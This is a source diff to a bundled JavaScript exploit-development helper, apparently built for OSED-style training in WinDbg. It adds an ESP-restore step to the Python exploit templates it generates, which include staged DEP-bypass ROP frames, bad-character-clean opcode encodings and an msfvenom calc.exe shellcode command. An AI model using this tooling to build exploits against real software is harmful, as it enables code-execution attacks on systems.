@@ -11842,10 +11842,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-23T07:39:33.090Z" : globalThis[key2];
+        value = true ? "2026-11-23T09:32:35.350Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "132fb1352abd" : globalThis[key2];
+        value = true ? "3ea74b5c4ded" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
@@ -14979,8 +14979,9 @@ var osed_bundle = (() => {
     var _a2;
     return Math.min(WPM_COPY, (_a2 = facts.caveBytes) != null ? _a2 : WPM_COPY);
   };
+  var stackSlot = (api) => FRAMES[api].findIndex((slot) => slot.source.kind === "shellcode");
   function stagedPops(api, writeOffset, pivotPops) {
-    return [...FRAMES[api].map((_, i) => 4 * i - writeOffset), 0 - 4 * pivotPops];
+    return [...FRAMES[api].map((_, i) => 4 * i - writeOffset), 0 - 4 * pivotPops, 4 * stackSlot(api)];
   }
   function stagingBase(run, span, pops, bad) {
     const clean2 = (value) => [0, 8, 16, 24].every((shift) => bad.indexOf(value >>> shift & 255) < 0);
@@ -15700,6 +15701,20 @@ var osed_bundle = (() => {
     }
     return assumed(`EIP ${hex325(eip)} is not on the stack below ESP, so no ret popped it`, RET_N);
   }
+  function stackRestore(at, text, bad) {
+    const forms = [
+      { pre: [139, 37], post: [], asm: `mov esp, dword [${text}]` },
+      { pre: [161], post: [148], asm: `mov eax, dword [${text}] ; xchg eax, esp` }
+    ];
+    const address = [0, 8, 16, 24].map((shift) => at >>> shift & 255);
+    const raw = (bytes) => bytes.map((b) => b.toString(16).padStart(2, "0")).join("");
+    for (const form of forms) {
+      if ([...form.pre, ...form.post, ...address].some((b) => bad.indexOf(b) >= 0)) continue;
+      const parts = [`bytes.fromhex("${raw(form.pre)}")`, `p32(${text})`, ...form.post.length ? [`bytes.fromhex("${raw(form.post)}")`] : []];
+      return { expr: parts.join(" + "), asm: form.asm };
+    }
+    return void 0;
+  }
   function filler(bad) {
     var _a2;
     const byte = (_a2 = [...Array.from({ length: 26 }, (_, i) => 65 + i), ...Array.from({ length: 26 }, (_, i) => 97 + i)].find((b) => bad.indexOf(b) < 0)) != null ? _a2 : 65;
@@ -16211,6 +16226,7 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
       return fn;
     };
     let frameBlock = [];
+    let restore;
     const chain = [];
     if (style === "skeleton") {
       const frame = FRAMES[api];
@@ -16295,14 +16311,17 @@ is ESP plus a few hundred bytes, so this needs an add or a sub of a register the
       const staging = input.staging;
       const span = 4 * frame.length;
       const addrRegister = (_n = write2 == null ? void 0 : write2.at.address) != null ? _n : "";
+      const back = 4 * stackSlot(api);
+      restore = staging === void 0 ? void 0 : stackRestore(staging + back >>> 0, stagingText(back), badchars);
       frameBlock = staging === void 0 ? [] : [
         `STAGING = ${hex6(staging)}      # the frame is laid here: ${span} writable bytes in ${input.module}`,
-        ...frame.map((slot2, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot2.name}${i === 0 ? "   <- the pivot's ret enters the call here" : ""}`),
+        ...frame.map((slot2, i) => `#   ${stagingText(4 * i).padEnd(22)}${slot2.name}${i === 0 ? "   <- the pivot's ret enters the call here" : 4 * i === back ? "   <- and the sled reads ESP back out of here" : ""}`),
         ...placed("0")
       ];
-      if (staging === void 0 || !write2 || !pivot) {
+      if (staging === void 0 || !write2 || !pivot || !restore) {
         chain.push(...hole("payload", staging === void 0 ? `no run of ${span} writable bytes in ${input.module} with every field address free of the bad chars: the chain pops each one
-dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/7] has no exact pick for write or pivot: write this chain and its payload by hand"));
+dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : !restore ? `no clean encoding of ${stagingText(back)} into esp: the sled has to put ESP back on the stack before the shellcode runs, and both
+forms of that instruction carry a bad byte here. Lay the frame elsewhere, or write the restore by hand.` : "[4/7] has no exact pick for write or pivot: write this chain and its payload by hand"));
       } else {
         const fns = frame.map((slot2) => defineLoader(slot2, valueRegister, []));
         const addresses = [];
@@ -16338,7 +16357,7 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
           ...SLED,
           { line: "" },
           { line: 'payload  = PAD * CHAIN_AT + b"".join(p32(w) for w in c)' },
-          { line: "payload += PAD * gap + nops + shellcode" }
+          { line: "payload += PAD * gap + restore + nops + shellcode" }
         );
       }
     } else {
@@ -16423,7 +16442,11 @@ dx @$osed().code_caves("", ${hex6(span)}, 25, "${badSpaced}", "STAGING")` : "[4/
       ...[
         'nops = b"\\x90" * 16',
         ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
-        ...sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : [],
+        ...restore ? [
+          `restore = ${restore.expr}`,
+          `# ${restore.asm}: ESP back on the stack, which the frame field holds, before the shellcode runs`
+        ] : [],
+        ...sized ? [`size = len(${restore ? "restore + " : ""}nops + shellcode)`, "while not clean(neg(size)): size += 1"] : [],
         "c = Chain()",
         "c.skip = RET_GAP                 # junk after the first gadget for the bytes the ret into it skips: [6/7]",
         ...render(chain, ""),
@@ -27939,7 +27962,8 @@ ${INDENT}`)]);
         if (cave === void 0) warn(`Code cave: none of 0x${WPM_MIN_COPY.toString(16)} bytes or more with a clean address in ${modulesLabel}. Try dx @$osed().code_caves("", 0x${WPM_MIN_COPY.toString(16)}, 25, "${badText}", "EXEC").`);
         else info(`Code cave (return address and lpBaseAddress) = ${hex325(cave)}, executable (code_caves EXEC), 0x${(caveBytes != null ? caveBytes : 0).toString(16)} bytes.`);
         if (cave !== void 0 && copy < WPM_COPY) {
-          warn(`nSize = 0x${copy.toString(16)}, not the usual 0x${WPM_COPY.toString(16)}: that is all this cave holds. Your shellcode and its NOP sled must fit in 0x${copy.toString(16)} bytes, or the copy runs past the cave.`);
+          const also = style === "staged" ? ", the six bytes of [7/7]'s ESP restore" : "";
+          warn(`nSize = 0x${copy.toString(16)}, not the usual 0x${WPM_COPY.toString(16)}: that is all this cave holds. Your shellcode${also} and its NOP sled must fit in 0x${copy.toString(16)} bytes, or the copy runs past the cave.`);
         }
       }
       if (!blocker && build.routes.length > 0) {
@@ -27959,7 +27983,8 @@ ${INDENT}`)]);
           const slots = FRAMES[depApi].length;
           echo("code_caves", [modules[0], hex(4 * slots), 25, badText, "STAGING"]);
           info(`The frame is laid at ${hex325(staging)}: ${4 * slots} writable bytes in ${modulesLabel}, not in the payload. Every one of its ${slots} field addresses is free of the bad bytes, so the chain pops them as they are.`);
-          info(`${hex325((_i = roomBelow()) != null ? _i : 0)} bytes of that run sit below the frame, and that is the stack ${depApi} gets: it pushes down from here. The frame is laid as high in the run as its own field addresses allow, for exactly this reason.`);
+          info(`${hex325((_i = roomBelow()) != null ? _i : 0)} bytes of that run sit below the frame, and that is the stack ${depApi} itself runs on: it pushes down from here. The frame is laid as high in the run as its own field addresses allow, for exactly this reason.`);
+          info(`The call's ret leaves ESP on the frame, so the sled in [7/${n}] starts by loading it back out of ${hex325(staging + 4 * stackSlot(depApi) >>> 0)}, the field holding the sled's own stack address. An API returns on a few hundred bytes of this run; a shellcode does not.`);
           warn("A run of zero, int3 or nop bytes in a writable section. Nothing here proves the program never writes there.");
         } else if (style === "staged") for (const line of (_j = solved == null ? void 0 : solved.unavailable) != null ? _j : []) warn(line);
         if (seh) printSehDelivery(seh, sehCrash, delivery.kind === "seh", style === "skeleton" ? 4 * FRAMES[depApi].length : 0, style);
